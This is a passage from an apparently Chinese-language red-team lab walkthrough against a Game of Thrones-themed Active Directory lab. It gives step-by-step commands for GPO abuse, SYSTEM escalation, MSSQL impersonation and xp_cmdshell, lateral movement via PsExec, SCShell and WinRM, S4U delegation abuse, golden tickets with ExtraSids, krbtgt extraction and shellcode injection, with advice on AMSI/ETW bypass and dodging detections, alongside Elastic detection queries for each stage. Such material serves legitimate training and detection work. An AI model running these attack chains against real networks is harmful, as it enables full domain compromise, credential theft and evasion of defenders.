通过 SOCKS 代理运行 pygpoabuse。 **Extension-Kit 中不存在用于 GPO 操纵的 BOF（最佳方案）。** 我们本可以用 SharpGPOAbuse 这个.NET 二进制以内联 execute 的方式运行，但那样做会永久把 CLR 加载进 agent 进程，而且我们也想避免 fork-and-run。

```
token revert
socks start 1080
```

从 Kali：

```bash
proxychains -q python3 ~/TOOLS/ACTIVEDIR/pyGPOAbuse/pygpoabuse.py \
  'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
  -gpo-id "02069b0e-d6c4-49e9-bea3-68adf6b109a6" \
  -command 'net localgroup administrators samwell.tarly /add' \
  -taskname 'Update' -f \
  -dc-ip 10.1.10.11
```

随后以任意用户身份强制刷新 GPO：

```
config ppid 1661
process create --command "cmd.exe /c gpupdate /force"
```

SOCKS 代理把 LDAP/SMB 流量经由信标转发，因此 **DC 看到的流量来源是 castelblack（10.1.10.22），而不是一个外部 IP**。

**OPSEC 对比：**

| 因素  | 渗透测试（直连 pygpoabuse） | 红队（经 SOCKS 的 pygpoabuse） |
| --- | --- | --- |
| 源 IP | Kali IP | SRV02 IP（经 SOCKS） |
| 协议  | 到 DC 的 SMB + LDAP | 相同，但来源在内部 |
| GPO 修改 | 立即在 SYSVOL 中创建计划任务 | 相同的机制 |
| 检测  | GPO 变更 + 计划任务创建 | 相同的检测，不同的源 IP |

**Elastic 查询 - 检测 GPO 滥用：**

预置规则：

```
rule.name:"Group Policy Abuse for Privilege Addition"
rule.name:"A scheduled task was created"
```

KQL 查询 —— 针对目标上 `net localgroup` 命令的执行：

```
event.code:"1" AND process.name:"net.exe" AND process.command_line:*localgroup* AND process.command_line:*administrators*
```

### 4.2 - 本地权限提升（在 castelblack 上提权到 SYSTEM）

**MITRE ATT&CK**：T1134.001（访问令牌操纵：令牌模拟/窃取）、T1068（利用漏洞进行权限提升）

**渗透测试路线**：不需要。在渗透测试路线中，evil-winrm 拿到管理员凭据后已经以管理员身份运行。

**C2 命令（来自 castelblack agent，以 `samwell.tarly` 或 `jeor.mormont` 身份运行）：**

在 GPO 滥用把 `samwell.tarly` 加入本地 Administrators 之后，或在获得 `jeor.mormont` 的凭据（他本身就是 castelblack 上的本地管理员）之后，提权到 SYSTEM：

**方式 A —— getsystem BOF（推荐）：**

```
token revert
getsystem token
```

这会将当前 agent 提升到 SYSTEM，并通过模拟获得 TrustedInstaller 组权限。

**方式 B —— Potato BOF（仅当拥有 SeImpersonate 权限时）：**

```
potato-dcom --token
```

或：

```
potato-print --token
```

完整语法：

```lua
potato-dcom --token
potato-dcom --run <program with args>
potato-print --token
potato-print --run <program with args>
```

**Elastic 查询 - 检测权限提升：**

预置规则：

```
rule.name:"Privilege Escalation via Named Pipe Impersonation" OR rule.name:"Privilege Escalation via Rogue Named Pipe Impersonation"
rule.name:"Process Created with an Elevated Token"
```

* * *

## 5 - Microsoft SQL Server 漏洞利用

**MITRE ATT&CK**：T1078（有效账户）、T1505.001（SQL 存储过程）

SQL Server 是 Active Directory 环境中常见的横向移动与权限提升目标。 **模拟链（EXECUTE AS LOGIN）能让低权限域用户在完全不碰 LSASS、不创建任何新进程的情况下升级到 sysadmin。** 本节讲述通过 Kharon agent 使用 SQLRecon 内联经 execute-assembly 执行的发现、模拟、枚举与 OS 命令执行流程。

### 5.1 - 实例发现（Instance Discovery）

SQL Browser 服务在 UDP 1434 上返回实例元数据。先确认实例可达。

**渗透测试（来自 Kali）：**

```
nxc mssql 10.1.10.22
```

**C2（来自 castelblack agent）：**

mssql BOF 直接通过 ODBC 查询 UDP 1434。 **不创建子进程。**

```
mssql 1434udp 10.1.10.22
```

响应显示实例名、版本和 TCP 端口。 **SQL Browser 服务必须处于运行状态该查询才能成功。**

### 5.2 - 服务器信息（Server Information）

**渗透测试（来自 Kali，经 SOCKS 代理）：**

```
proxychains mssqlclient.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.1.10.22 -windows-auth
```

**C2（SQLRecon 经 execute-assembly）：**

使用 SQLRecon 是因为它支持 Windows 身份认证，而 SQL-BOF 系列不支持。 **SQLRecon 通过 execute-assembly 内联运行。它把.NET CLR 加载进信标进程并使用 Windows 域认证连接。磁盘上不写入任何二进制文件。**

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:info
```

### 5.3 - 当前用户上下文（Current User Context）

whoami 模块显示映射的用户、权限和角色成员关系。

**C2 命令：**

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:whoami
```

`samwell.tarly` 映射到 guest 用户，拥有 CONNECT SQL 和 VIEW ANY DATABASE 权限。 **没有 sysadmin 角色，因此无法直接枚举表或执行命令。**

### 5.4 - 模拟枚举（Impersonation Enumeration）

SQL Server 支持 EXECUTE AS LOGIN，允许一个登录身份冒充另一个。impersonate 模块列出当前用户可以模拟的账户。

**C2 命令（samwell.tarly）：**

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:impersonate
```

`samwell.tarly` 可以模拟 `sa` （sysadmin）。

**C2 命令（jon.snow）：**

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:jon.snow /password:iknownothing /module:impersonate
```

`jon.snow` 拥有更宽的模拟链。 **任何拥有 EXECUTE AS LOGIN 权限的域账户，都会成为通往 SQL Server sysadmin 的跳板。** 攻击者一旦通过（Kerberoasting、LSASS 转储或 NETLOGON 脚本）拿下其中任意用户的凭据，无需任何漏洞利用即可升级为 `sa` 。

### 5.5 - 数据库与用户枚举（以 sa 身份）

sa 模拟确认后，后续所有命令都使用 `/i:sa` 以 sysadmin 权限操作。

**C2 命令（数据库）：**

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:databases /i:sa
```

**C2 命令（用户）：**

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:users /i:sa
```

### 5.6 - 链接服务器枚举（以 sa 身份）

链接服务器保存了跨服务器查询所需的凭据。在存在多个 SQL 实例的环境中，链接服务器凭据是一条横向移动路径。

**C2 命令：**

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:links /i:sa
```

### 5.7 - 通过 xp_cmdshell 执行 OS 命令（以 sa 身份）

xp_cmdshell 通过 SQL Server 运行操作系统命令，默认处于禁用状态。拥有 sysadmin 权限（通过模拟 sa 获得）后，启用它并执行命令。

**渗透测试（mssqlclient.py 经 SOCKS 代理）：**

```
proxychains mssqlclient.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.1.10.22 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

**C2（SQLRecon 经 execute-assembly）：**

首先启用 xp_cmdshell：

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:enablexp /i:sa
```

随后执行一条系统命令 —— whoami：

```bash
execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:xpcmd /i:sa /c:whoami
```

该命令以 `north\sql_svc` 身份运行，即 SQL Server 服务账户。 **从这里开始，攻击者可以写文件、加用户，或在 SQL 服务上下文中部署一个新的信标。**

**OPSEC 对比：**

| 因素  | 渗透测试（mssqlclient.py） | 红队（SQLRecon 经 execute-assembly） |
| --- | --- | --- |
| 磁盘上的工具 | 无（在 Kali 上运行） | 无（内联加载.NET CLR） |
| 进程创建 | 不适用 | 无子进程。CLR 加载进信标 |
| 网络  | 来自 Kali IP 的 TCP 1433 | 来自内部域主机的 TCP 1433 |
| 持久化 | mssqlclient.py 会话 | mssql BOF 直接使用 ODBC |
| 检测  | 异常的外部 SQL 连接 | 标准的内部 SQL 流量 |

**OPSEC 备注：**

SQLRecon 通过 execute-assembly 内联运行。.NET CLR 加载进信标进程。 **不创建子进程，也不写入任何二进制文件。**

mssql BOF 使用 ODBC 直接连接。它会在 TCP 1433 上产生网络流量，但 **不产生进程创建事件**。

**Elastic 没有针对 SQL Server 模拟或 xp_cmdshell 启用的预置规则。检测需要自定义规则来监控 SQL Server 审计日志，或监控 Windows Security Event 4688 中由 sqlservr.exe 派生的进程。**

**Elastic 查询 - 检测 xp_cmdshell 执行：**

通过查找 sqlservr.exe 的子进程来检测 xp_cmdshell。这可以捕获通过 SQL Server 运行的所有操作系统命令，无论触发它的工具是什么。

```
process.parent.name:"sqlservr.exe" AND NOT process.name:("sqlwriter.exe" OR "sqlceip.exe" OR "sqlagent.exe")
```

**Elastic 查询 - 检测 SQL Server 配置变更：**

检测启用 xp_cmdshell 或 Ole Automation Procedures 的 sp_configure 调用。 **需要启用并转发到 Elastic 的 SQL Server 审计日志，默认未配置。**

```
event.provider:"MSSQLSERVER" AND winlog.event_data.TextData:("xp_cmdshell" OR "Ole Automation Procedures" OR "show advanced options")
```

* * *

## 6 - 横向移动（Lateral Movement）

### 6.1 - WinRM（evil-winrm 等价手法）

**MITRE ATT&CK**：T1021.006（远程服务：Windows 远程管理）

> **本路线未被执行。目标主机的 WMI/WSMan 子系统出现内部错误。**

**渗透测试命令（来自 Kali）：**

```
evil-winrm -i 10.1.10.11 -u samwell.tarly -p Heartsbane
```

**C2 命令（来自 castelblack agent）：**

先以 `samwell.tarly` 身份制作令牌：

```
token make -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
token list
token impersonate 7576
config amsi_etw_bypass all
invoke winrm winterfell.north.sevenkingdoms.local "whoami /all"
```

或使用显式凭据：

```
config amsi_etw_bypass all
invoke winrm 10.1.10.11 "powershell -c 'Get-Process | Select-Object Name,Id'" -u north\samwell.tarly -p Heartsbane -t 10000
```

完整语法：

```
invoke winrm <target> <command> [-t timeout_ms] [-b] [-u DOMAIN\user] [-p password]
```

| 标志  | 作用  |
| --- | --- |
| `-t` | 超时时间（毫秒）。0 表示无限等待（默认）。 |
| `-b` | 后台执行。保持 shell 打开但不捕获输出。 |
| `-u` | 备用凭据的用户名，格式为 `DOMAIN\user` 。 |
| `-p` | 备用凭据的密码。 |

**OPSEC 对比：**

| 因素  | 渗透测试（evil-winrm） | 红队（invoke winrm BOF） |
| --- | --- | --- |
| 来源  | 外部 Kali IP | 内部 SRV02 IP |
| 认证  | NTLM（密码） | Kerberos（当前令牌）或显式凭据 |
| 目标上的进程 | wsmprovhost.exe | wsmprovhost.exe |
| 持久 shell | 有（交互式） | 无（单命令执行） |

**Elastic 查询 - 检测 WinRM 横向移动：**

```
rule.name:"Incoming Execution via WinRM Remote Shell"
rule.name:"Incoming Execution via PowerShell Remoting"
```

### 6.2 - PsExec（基于服务的横向移动）

**MITRE ATT&CK**：T1021.002（远程服务：SMB/Windows 管理共享）、T1569.002（系统服务：服务执行）

**渗透测试命令（来自 Kali）：**

```
impacket-psexec north.sevenkingdoms.local/samwell.tarly:'Heartsbane'@10.1.10.11
```

**C2 命令（来自 castelblack agent）：**

使用 psexec BOF。先以 `samwell.tarly` 身份制作令牌：

```
token make -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
token list
token impersonate 8529
```

创建自定义服务名和二进制名以降低特征：

```
jump psexec -b svcutil.exe -n "WinConfigSvc" -d "Manages system configuration updates" 10.1.10.11 /local/path/to/smb_x64_svc.exe
```

> **SMB 信标是更好也更现实的选择，如后文所示；然而 Kharon Listener 的配置目前尚不支持 SMB。** 如果你必须使用默认的 Adaptix SMB 信标，请在下方命令之后立即执行 `link smb <target_ip> <pipe_name>` 来连接到 SMB 信标。

**C2 命令（默认 Adaptix 信标 + SMB 枢纽）：**

默认 Adaptix agent 原生支持 SMB 监听器。 **这让横向移动更贴近现实：PsExec 把 SMB 信标投递到目标，父信标再通过命名管道与之链接。所有 C2 流量都通过父 HTTP 信标隧穿。目标上不会产生任何新的出站连接。**

```
jump psexec -b svcutil2.exe -n "WinConfigSvc134" -d "Manages system configuration updates" 10.1.10.11 /home/stillbigjosh/Downloads/svc_smb_x64.exe
```

服务执行完毕后，通过命名管道链接到目标上的 SMB 信标：

```
link smb 10.1.10.11 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57
```

SMB 链接已建立。SMB 信标已在 winterfell 上激活。

完整语法：

```
jump psexec <target> <binary> [-b binary_name] [-s share] [-p svc_path] [-n svc_name] [-d svc_description]
```

| 标志  | 默认值 | 作用  |
| --- | --- | --- |
| `-b` | 随机  | 目标上的远程二进制名称。 |
| `-s` | `ADMIN$` | 复制二进制文件的目标共享。 |
| `-p` | `C:\Windows` | 目标上的服务文件路径。 |
| `-n` | 随机  | 要创建的服务名。 |
| `-d` | 随机  | 服务描述。 |

**OPSEC 对比：**

| 因素  | 渗透测试（impacket psexec） | 红队（jump psexec BOF） |
| --- | --- | --- |
| 来源  | 外部 IP | 内部 SRV02 IP |
| 服务名 | 随机 8 字符名称 | 自定义名称（更不显眼） |
| 二进制名 | ADMIN$ 中随机.exe | 自定义名称，位于指定路径 |
| 命名管道 | `\pipe\svcctl` | `\pipe\svcctl` |
| 服务创建 | Event ID 7045 | Event ID 7045 |

**Elastic 查询 - 检测 PsExec：**

```
rule.name:"PsExec Network Connection"
rule.name:"Suspicious Process Execution via Renamed PsExec Executable"
rule.name:"Suspicious Service was Installed in the System" OR rule.name:"Suspicious ImagePath Service Creation"
rule.name:"Remote Windows Service Installed"
```

Sysmon 命名管道检测：

```
event.code:"17" AND winlog.event_data.PipeName:*svcctl*
```

### 6.3 - SCShell（服务二进制路径修改，推荐）

**MITRE ATT&CK**：T1569.002（系统服务：服务执行）、T1543.003（创建或修改系统进程：Windows 服务）

SCShell 修改的是 **已存在** 服务的二进制路径，而不是创建新服务。 **这规避了 Event ID 7045（新建服务）。**

**渗透测试等价手法**：无直接等价物。Impacket 的 `smbexec.py` 使用了类似技术。

**C2 命令（来自 castelblack agent）：**

先以 `samwell.tarly` 身份制作令牌：

```
token make -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
token list
token impersonate 8529
```

指定服务名和自定义二进制名：

```
jump scshell 10.1.10.11 /local/path/to/smb_x64_svc.exe -n defragsvc -b update.exe -s C$ -p C:\Windows
```

> SMB 信标是更好也更现实的选择，如后文所示；然而 Kharon Listener 的配置目前尚不支持 SMB，如第 6.2 节所述。如果你必须使用默认的 Adaptix SMB 信标，请在下方命令之后立即执行 `link smb <target_ip> <pipe_name>` 来连接到 SMB 信标。

**C2 命令（默认 Adaptix 信标 + SMB 枢纽）：**

```
jump scshell 10.1.10.11 /home/stillbigjosh/Downloads/svc_smb_x64.exe -n defragsvc -b msupdate.exe -s C$ -p C:\Windows
```

SCShell 服务修改完毕后，通过命名管道链接：

```
link smb 10.1.10.11 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57
```

SMB 信标已链接。

完整语法：

```
jump scshell <target> <binary> [-b binary_name] [-s share] [-p svc_path] [-n service_name]
```

| 标志  | 默认值 | 作用  |
| --- | --- | --- |
| `-b` | 随机  | 目标上的远程二进制名称。 |
| `-s` | `ADMIN$` | 复制二进制文件的目标共享。 |
| `-p` | `C:\Windows` | 目标上的服务文件路径。 |
| `-n` | `defragsvc` | 要修改的已存在服务名。 |

推荐的服务目标（不关键、可安全修改的服务）：

> `defragsvc` （磁盘碎片整理，默认）
> 
> `SensorService` （传感器监控）
> 
> `SessionEnv` （远程桌面配置）
> 
> `IKEEXT` （IKE 与 AuthIP）

**OPSEC 优势：不创建新服务。已存在服务的 ImagePath 被临时修改，载荷执行完毕后原始路径被还原。**

如需命令执行而不部署信标，使用 invoke scshell：

```
invoke scshell 10.1.10.11 defragsvc "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

完整语法：

```
invoke scshell <target> <service_name> <command>
```

**Elastic 查询 - 检测 SCShell：**

**没有专门检测 SCShell 的预置规则。检测依赖对服务 ImagePath 的注册表修改监控：**

```ruby
event.code:"13" AND winlog.event_data.TargetObject:*Services* AND winlog.event_data.TargetObject:*ImagePath* AND NOT winlog.event_data.Image:(*svchost.exe* OR *services.exe* OR *TrustedInstaller.exe*)
```

服务启动/停止事件：

```
event.code:"7036" AND winlog.event_data.param1:("SensorService" OR "defragsvc" OR "SessionEnv" OR "IKEEXT")
```

### 6.4 - RDP（交互式桌面访问）

**MITRE ATT&CK**：T1021.001（远程服务：远程桌面协议）

**渗透测试命令（来自 Kali）：**

```bash
xfreerdp /v:10.1.10.11 /u:jon.snow /p:'iknownothing' /dynamic-resolution /timeout:60000 /cert:ignore
```

**C2 命令（来自 castelblack agent）：**

使用 SOCKS 代理让 RDP 经由信标隧道，以任意用户身份连接：

```
socks start 1080
```

从 Kali：

```bash
proxychains -q xfreerdp /v:10.1.10.11 /u:jon.snow /p:'iknownothing' /dynamic-resolution /cert:ignore
```

**两种方式用的是同一个 RDP 协议。SOCKS 代理只改变了源 IP —— 从 Kali 变成信标主机。**

**Elastic 查询 - 检测 RDP：**

```
rule.name:"Interactive Logon by an Unusual Process"
rule.name:"Potential Remote Desktop Tunneling Detected"
event.code:"4624" AND winlog.event_data.LogonType:"10"
```

* * *

## 7 - 域提权（Domain Escalation）

### 7.1 - 受限委派滥用（jon.snow）

**MITRE ATT&CK**：T1550.003（使用备用认证材料：传递票据）、T1558（窃取或伪造 Kerberos 票据）

**渗透测试命令（来自 Kali）：**

```
impacket-findDelegation -dc-ip 10.1.10.11 "north.sevenkingdoms.local/jon.snow:iknownothing"
```

**C2 命令（来自 castelblack agent）：**

第 1 步 —— 枚举委派：

```
ldapsearch (msDS-AllowedToDelegateTo=*) -a sAMAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

第 2 步 —— 为 `jon.snow` 请求 TGT：

```
kerbeus asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /enctype:aes256 /opsec
```

第 3 步 —— 执行 S4U 攻击（S4U2Self + S4U2Proxy），冒充 Administrator 访问 winterfell 上的 CIFS：

```bash
kerbeus s4u /impersonateuser:Administrator /service:CIFS/winterfell.north.sevenkingdoms.local /domain:north.sevenkingdoms.local /ptt /ticket:<base64_tgt_from_step2>

kerbeus describe /ticket::<base64_tgt_from_step3>

kerbeus ptt /ticket::<base64_tgt_from_step3>

kerbeus klist

dir \\winterfell.north.sevenkingdoms.local\c$
```

完整语法：

```bash
kerbeus s4u /ticket:BASE64 /service:SPN /impersonateuser:USER [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]
```

**OPSEC 对比：**

| 因素  | 渗透测试（findDelegation + getST） | 红队（kerbeus BOF） |
| --- | --- | --- |
| 来源  | 外部 IP | 内部域主机 |
| 协议  | 来自 Kali 的 Kerberos | 来自信标的 Kerberos |
| 目标上的进程痕迹 | 无   | 无（BOF 在内存中） |
| 票据处理 | Kali 上的 ccache 文件 | 通过 `/ptt` 注入当前 LUID |

**Elastic 查询 - 检测委派滥用：**

```
rule.name:"Kerberos Traffic from Unusual Process "
rule.name:"Sensitive Privilege SeEnableDelegationPrivilege assigned to a User"
```

S4U2Proxy 会生成 TransmittedServices 字段被填充的 Event 4769。 **该审计默认未启用。** 执行攻击前，请通过 Proxmox 在两台 DC 上开启：

```sql
# DC02 (winterfell, VMID 111)
ssh root@192.168.1.100 "qm guest exec 111 -- powershell.exe -Command 'auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable'"

# DC01 (kingslanding, VMID 110)
ssh root@192.168.1.100 "qm guest exec 110 -- powershell.exe -Command 'auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable'"
```

然后在 Elastic 中查询 S4U2Proxy 事件：

```
event.code:"4769" AND winlog.event_data.TransmittedServices:*
```

### 7.2 - ExtraSids / 黄金票据（子域到父域）

**MITRE ATT&CK**：T1558.001（窃取或伪造 Kerberos 票据：黄金票据）

**渗透测试命令（来自 Kali）：**

```
raiseChild.py -target-exec 10.1.10.10 north.sevenkingdoms.local/samwell.tarly:Heartsbane
```

或手动路径：

```
ticketer.py -aesKey <krbtgt_aes> -domain-sid S-1-5-21-... -domain north.sevenkingdoms.local -extra-sid S-1-5-21-...-519 Administrator
secretsdump.py -k -no-pass 'north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local' -just-dc-user 'sevenkingdoms/Administrator'
```

**C2 命令（在横向移动到 winterfell 并提权到 SYSTEM 之后，来自 winterfell agent）：**

移动到 winterfell（DC02）并提权到 SYSTEM 之后（见第 6 节），提取 krbtgt 哈希。由于你在 DC02 上拥有 SYSTEM，使用 lsadump（**不产生 DCSync 复制流量**）：

```
lsadump_secrets
```

如果 lsadump 未返回 krbtgt 密钥，则仅针对 krbtgt 使用 DCSync：

```
dcsync single krbtgt -dc winterfell.north.sevenkingdoms.local
```

第 2 步 —— 使用 ExtraSids 创建黄金票据。 **Kerbeus-BOF 没有 golden 子命令。** 使用 execute-assembly 配合 Rubeus：

```bash
execute-assembly /path/to/Rubeus.exe golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-3070733070-37185155-1944012974 /aes256:<krbtgt_aes256_from_step1> /sids:S-1-5-21-4129000305-2956170768-4065605194-519 /ptt /nowrap /simple
```

或通过 SOCKS 离线伪造票据并注入：

```
socks start 1080
```

从 Kali：

```
proxychains -q ticketer.py -aesKey <krbtgt_aes> \
  -domain-sid S-1-5-21-3070733070-37185155-1944012974 \
  -domain north.sevenkingdoms.local \
  -extra-sid S-1-5-21-4129000305-2956170768-4065605194-519 \
  Administrator
```

随后转换并通过 kerbeus 注入：

```
ticketConverter.py Administrator.ccache Administrator.kirbi
base64 -w 0 Administrator.kirbi
```

回到 Kharon agent：

```
kerbeus ptt /ticket:<base64_kirbi>
```

第 3a 步 —— 通过手动上传 + invoke scshell 移动到 DC01（kingslanding）：

```lua
dir \\kingslanding.sevenkingdoms.local\ADMIN$

upload /local/path/to/http_x64.exe \\kingslanding.sevenkingdoms.local\ADMIN$\http_x64.exe

invoke scshell kingslanding.sevenkingdoms.local defragsvc "C:\Windows\http_x64.exe"
```

第 3b 步 —— 替代方案：通过 jump scshell BOF 移动到 DC01（单条命令，规避 Event ID 7045）：

```
jump scshell kingslanding.sevenkingdoms.local /path/to/http_x64.exe -n defragsvc
```

第 3c 步 —— 默认 Adaptix SMB 信标 + 管道链接：

```
jump scshell kingslanding.sevenkingdoms.local /home/stillbigjosh/Downloads/svc_smb_x64.exe -n defragsvc
link smb 10.1.10.11 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57
```

SMB 信标已在 kingslanding 上链接。

**OPSEC 警告：黄金票据的使用会生成 Event 4769，其中票据生命周期可能异常。ExtraSids 在跨林（forest）场景下会专门触发 SID 过滤检查（但在同一林内的子域到父域场景下不会）。**

**Elastic 查询 - 检测黄金票据 / ExtraSids：**

```
rule.name:"* DCSync"
rule.name:"KRBTGT Delegation Backdoor"
rule.name:"Potential Credential Access via DCSync"
```

针对 Kerberos 异常：

```
event.code:"4769" AND winlog.event_data.ServiceName:"krbtgt"
```

* * *

## 8 - 后渗透（Post-Exploitation）

### 8.1 - 文件操作（File Operations）

**MITRE ATT&CK**：T1039（从网络共享驱动器获取数据）

**渗透测试命令（从共享下载文件）：**

```
smbclient -U "samwell.tarly" //10.1.10.22/all
smb: \> get arya.txt
```

**C2 命令（来自 castelblack agent）：**

```
fs ls \\10.1.10.22\all
fs cat \\10.1.10.22\all\arya.txt
```

或下载到 C2 服务器：

```
download C:\path\to\target\file.txt
```

完整文件系统语法：

```bash
fs pwd
fs cd <path>
fs ls <path>
fs cat <path>
fs mkdir <path>
fs cp <source> <destination>
fs mv <source> <destination>
fs rm <path>
```

**Elastic 查询：**

以已认证域用户身份从 SMB 读取文件， **没有针对性的检测手段。**

### 8.2 - NETLOGON 脚本发现（NETLOGON Script Discovery）

**MITRE ATT&CK**：T1552.001（不安全凭据：文件中的凭据）

**渗透测试命令（来自 Kali）：**

```
smbclient -U "jon.snow" //10.1.10.11/NETLOGON
smb: \> get script.ps1
smb: \> get secret.ps1
```

**C2 命令（来自 castelblack agent）：**

```
fs ls \\winterfell.north.sevenkingdoms.local\NETLOGON
fs cat \\winterfell.north.sevenkingdoms.local\NETLOGON\script.ps1
fs cat \\winterfell.north.sevenkingdoms.local\NETLOGON\secret.ps1
```

**Elastic 查询：**

访问 NETLOGON 是正常的域流量。 **没有任何预置规则触发。** 你可以这样审计：

```
event.code:"5145" AND winlog.event_data.ShareName:*NETLOGON*
```

### 8.3 - 态势感知（Situational Awareness）

**MITRE ATT&CK**：T1033（系统所有者/用户发现）、T1016（系统网络配置发现）、T1082（系统信息发现）

**渗透测试命令（来自已被攻陷的主机）：**

```
whoami /all
ipconfig /all
net localgroup administrators
```

**C2 BOF 命令（来自任意 agent）：**

```
whoami
ipconfig
arp
env
routeprint
uptime
```

以上全部是 SAL-BOF 模块。 **它们运行在信标进程的内存中，不派生任何子进程。**

额外的 SAL-BOF 命令：

```
dir <path> [/s]
cacls <path>
nslookup <domain> [server] [type]
listdns
useridletime
privcheck <module>
```

privcheck BOF 接受以下模块用于本地权限提升检查： `alwayselevated` 、 `hijackablepath` 、 `tokenpriv` 、 `unattendfiles` 、 `unquotedsvc` 、 `vulndrivers` 。

**OPSEC 优势：没有 cmd.exe、whoami.exe 或 net.exe 进程创建事件。BOF 直接从信标进程调用底层 Windows API。**

**Elastic 查询 - 检测发现类命令：**

```
rule.name:"Account or Group Discovery via Built-In Tools"
rule.name:"Enumeration of Administrator Accounts"
```

这些规则检测 net.exe 或 whoami.exe 的进程创建。 **基于 BOF 的等价操作不会触发这些规则，因为没有子进程被创建。**

* * *

## 9 - Shellcode 注入（用于部署新信标）

### 9.1 - CreateRemoteThread（Kharon 内置方法）

**MITRE ATT&CK**：T1055（进程注入）

Kharon 的 `scinject` 命令与 `kit_explicit_inject.cc` 使用 VirtualAllocEx + WriteProcessMemory + VirtualProtectEx + CreateRemoteThread。

**C2 命令：**

```
scinject <target_pid> /path/to/shellcode.bin
```

或通过 postex fork 显式注入到已有进程：

```
execute postex -m fork -t explicit -p <target_pid> -f /path/to/shellcode.bin -a ""
```

完整 postex 语法：

```
execute postex -m <inline|fork> -t <none|spawn|explicit> -p <pid> -f <file> -a <args>
```

| 标志  | 取值  | 作用  |
| --- | --- | --- |
| `-m` | inline, fork | inline 在当前进程中运行。fork 在新进程或已有进程中运行。 |
| `-t` | none, spawn, explicit | spawn 创建一个新的牺牲进程（使用 spawnto）。explicit 注入到指定的 PID。 |
| `-p` | PID | explicit 注入的目标 PID。 |
| `-f` | 文件路径 | C2 服务器上的 shellcode 文件路径。 |
| `-a` | 字符串 | 传给 shellcode 模块的参数。 |

**Elastic 查询：**

```
rule.name:"Process Injection - Detected - Elastic Endgame"
```

Sysmon Event 8（CreateRemoteThread）：

```
event.code:"8" AND NOT winlog.event_data.SourceImage:(*csrss.exe* OR *wininit.exe* OR *winlogon.exe* OR *services.exe* OR *lsass.exe* OR *svchost.exe*)
```

### 9.2 - Extension-Kit 注入 BOF

**MITRE ATT&CK**：T1055（进程注入）

Injection-BOF 模块提供了四种替代注入方式。

**inject-sec（节映射）：**

```
inject-sec <pid> <shellcode_file>
```

它使用 NtCreateSection + NtMapViewOfSection，而不是 VirtualAllocEx 和 WriteProcessMemory。内存分配与写入调用因此不同。 **但仍然会创建一个远程线程来执行映射的节。**

**Elastic 查询：**

```
rule.name:"Process Injection - Detected - Elastic Endgame"
```

Sysmon Event 8（CreateRemoteThread）：

```
event.code:"8" AND NOT winlog.event_data.SourceImage:(*csrss.exe* OR *wininit.exe* OR *winlogon.exe* OR *services.exe* OR *lsass.exe* OR *svchost.exe*)
```

**任何在另一个进程中创建线程的远程进程注入都能触发 Sysmon Event ID 8（CreateRemoteThread）。即使 Adaptix 使用间接系统调用来调用 NtCreateThreadEx，Sysmon 依然是挂钩内核关于远程线程创建的回调。该事件无论如何都会被记录，与用户态调用路径无关。**

* * *

## 10 - 检测覆盖度总结（Detection Coverage Summary）

### 10.1 - 各攻击阶段触发的 Elastic 预置规则

| 攻击阶段 | 渗透测试方法 | 红队 C2 方法 | 触发的预置规则 |
| --- | --- | --- | --- |
| 主机发现 | nmap -sn | smartscan BOF | Potential Network Scan Executed From Host |
| 用户枚举 | nxc --users | ldapsearch BOF | 无（标准属性不触发 LDAP 规则，见第 2.2 节） |
| AS-REP Roast | GetNPUsers | kerbeus asreproasting | 无（需要自定义规则） |
| Kerberoast | GetUserSPNs | kerbeus kerberoasting | 无（需要自定义规则） |
| 凭据转储（LSASS） | 磁盘上的 mimikatz | nanodump -sc BOF | 渗透：5+ 条规则。红队：0-1 条 |
| 凭据转储（SAM） | 磁盘上的 hashdump | hashdump BOF | Credential Acquisition via Registry Hive Dumping |
| DCSync | secretsdump.py | dcsync single BOF | Potential Credential Access via DCSync |
| GPO 滥用 | 直连 pygpoabuse | 经 SOCKS 的 pygpoabuse | Group Policy Abuse for Privilege Addition |
| 横向移动（PsExec） | impacket-psexec | jump psexec BOF | PsExec Network Connection、Remote Windows Service Installed |
| 横向移动（SCShell） | 不适用 | jump scshell BOF | 无（需要自定义注册表查询） |
| 横向移动（WinRM） | evil-winrm | invoke winrm BOF | Incoming Execution via WinRM Remote Shell |
